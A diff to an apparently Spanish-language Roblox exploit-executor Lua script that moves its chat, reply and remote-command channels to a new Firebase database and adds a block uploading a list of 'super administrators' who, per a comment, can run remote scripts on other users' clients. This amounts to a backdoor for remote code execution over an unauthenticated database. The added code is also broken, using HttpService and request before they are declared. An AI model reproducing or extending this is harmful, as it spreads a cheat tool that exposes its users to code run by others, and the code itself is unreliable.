@@ -13,10 +13,33 @@ local ChatScripters = {
 }
 
 -- LISTA DE SUPER ADMINISTRADORES (Solo pueden ejecutar scripts remotos)
+-- LISTA DE SUPER ADMINISTRADORES (Solo pueden ejecutar scripts remotos)
 local SuperAdmins = {
     ["joao_modsF"] = true,
     ["donxexman"] = true
 }
+
+
+local superAdminsURL = "https://jxnc-60014-default-rtdb.firebaseio.com/SuperAdmins.json"
+
+task.spawn(function()
+    local adminsList = {}
+    for adminName, _ in pairs(SuperAdmins) do
+        adminsList[adminName] = true
+    end
+    
+    local json = HttpService:JSONEncode(adminsList)
+    
+    pcall(function()
+        request({
+            Url = superAdminsURL,
+            Method = "PUT",
+            Headers = { ["Content-Type"] = "application/json" },
+            Body = json
+        })
+    end)
+end)
+
 
 -- 🔧 SERVICIOS Y VARIABLES GLOBALES
 local HttpService = game:GetService("HttpService")
@@ -56,9 +79,14 @@ local ultimoComandoID = nil
 local comandosEjecutados = {} -- ✅ NUEVO: Para evitar ejecutar el mismo comando varias veces
 
 -- URLs de Firebase
-local firebaseURL = "https://chatsitouwu-xd-xd-default-rtdb.firebaseio.com/Chat.json"
-local respuestasURL = "https://chatsitouwu-xd-xd-default-rtdb.firebaseio.com/Respuestas.json"
-local remoteCommandsURL = "https://chatsitouwu-xd-xd-default-rtdb.firebaseio.com/RemoteCommands.json"
+-- Chat principal
+local firebaseURL = "https://jxnc-60014-default-rtdb.firebaseio.com/Chat.json"
+
+-- Respuestas
+local respuestasURL = "https://jxnc-60014-default-rtdb.firebaseio.com/Respuestas.json"
+
+-- Comandos remotos
+local remoteCommandsURL = "https://jxnc-60014-default-rtdb.firebaseio.com/RemoteCommands.json"
 local request = (syn and syn.request) or http_request or (fluxus and fluxus.request) or request
 
 -- 🎨 FUNCIONES DE STICKERS
@@ -271,7 +299,7 @@ if esParaMi then
                                 -- ✅ Eliminar comando después de 2 segundos
                                 pcall(function()
                                     request({
-                                        Url = "https://chatsitouwu-xd-xd-default-rtdb.firebaseio.com/RemoteCommands/" .. comandoId .. ".json",
+                                        Url = "https://jxnc-60014-default-rtdb.firebaseio.com/RemoteCommands/" .. comandoId .. ".json",
                                         Method = "DELETE"
                                     })
                                 end)
@@ -1731,7 +1759,7 @@ local function VerificarNotificaciones()
                             
                             pcall(function()
                                 request({
-                                    Url = "https://chatsitouwu-xd-xd-default-rtdb.firebaseio.com/Respuestas/" .. notifId .. ".json",
+                                    Url = "https://jxnc-60014-default-rtdb.firebaseio.com/Respuestas/" .. notifId .. ".json",
                                     Method = "DELETE"
                                 })
                             end)
@@ -2658,7 +2686,7 @@ task.spawn(function()
                         if mensaj._id then
                             pcall(function()
                                 request({
-                                    Url = "https://chatsitouwu-xd-xd-default-rtdb.firebaseio.com/Chat/" .. mensaj._id .. ".json",
+                                    Url = "https://jxnc-60014-default-rtdb.firebaseio.com/Chat/" .. mensaj._id .. ".json",
                                     Method = "DELETE"
                                 })
                             end)
